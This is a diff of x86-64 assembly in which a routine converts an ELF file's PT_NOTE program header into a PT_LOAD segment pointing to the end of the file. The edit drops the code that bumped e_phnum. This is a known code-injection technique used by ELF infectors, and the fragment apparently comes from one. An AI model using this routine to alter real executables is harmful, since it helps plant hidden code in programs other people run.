@@ -425,8 +425,8 @@ check_elf64_exec:
 ; ============================================
 ; add_pt_load(char *filepath)
 ; rdi = pointer to file path
-; Adds a PT_LOAD segment to the ELF file by finding and converting
-; a PT_NOTE segment to PT_LOAD, pointing to the end of the file
+; Converts a PT_NOTE segment to PT_LOAD in the ELF file,
+; pointing to the end of the file with filesz/memsz = 0x1000
 ; ============================================
 add_pt_load:
     push rbp
@@ -585,31 +585,8 @@ add_pt_load:
     ; p_align = 0x1000 (4KB alignment)
     mov qword [rdi + p_align], 0x1000
 
-    ; Increment e_phnum in the ELF header buffer to show one more program header
-    lea rdi, [rel elf_header_buf]
-    inc word [rdi + e_phnum]
-
-    ; Seek to beginning of file to write the ELF header
-    mov eax, SYS_LSEEK
-    mov edi, r13d               ; fd
-    xor esi, esi                ; offset = 0
-    xor edx, edx                ; SEEK_SET = 0
-    syscall
-
-    test rax, rax
-    js .add_pt_load_close_fail
-
-    ; Write the modified ELF header
-    mov eax, SYS_WRITE
-    mov edi, r13d               ; fd
-    lea rsi, [rel elf_header_buf]
-    mov edx, 64                 ; write 64 bytes
-    syscall
-
-    cmp rax, 64
-    jl .add_pt_load_close_fail
-
-    ; Seek to the program header table to write back
+    ; Seek to the program header table to write back the modified program headers
+    ; (We don't modify e_phnum - just convert PT_NOTE to PT_LOAD)
     mov eax, SYS_LSEEK
     mov edi, r13d               ; fd
     mov rsi, r14                ; offset = e_phoff
